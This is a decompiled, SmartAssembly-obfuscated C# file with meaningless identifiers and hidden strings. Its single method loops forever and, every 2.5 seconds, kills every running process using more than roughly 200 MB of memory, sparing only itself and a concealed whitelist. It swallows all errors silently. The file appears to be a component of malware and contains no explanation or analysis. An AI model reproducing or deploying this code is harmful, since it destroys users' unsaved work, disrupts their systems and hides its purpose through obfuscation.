using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

public static class tbRFZlCAIcg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void VMhIRHZEdd()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401293)) && !process.ProcessName.Contains(getString_0(107401316)) && !process.ProcessName.Contains(getString_0(107401307)) && !process.ProcessName.Contains(getString_0(107401266)) && !process.ProcessName.Contains(getString_0(107401285)) && !process.ProcessName.Contains(getString_0(107401272)) && !process.ProcessName.Contains(getString_0(107401227)) && !process.ProcessName.Contains(getString_0(107401246)) && !process.ProcessName.Contains(getString_0(107401201)) && !process.ProcessName.Contains(getString_0(107401220)) && !process.ProcessName.Contains(getString_0(107400655)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static tbRFZlCAIcg()
	{
		Strings.CreateGetStringDelegate(typeof(tbRFZlCAIcg));
	}
}
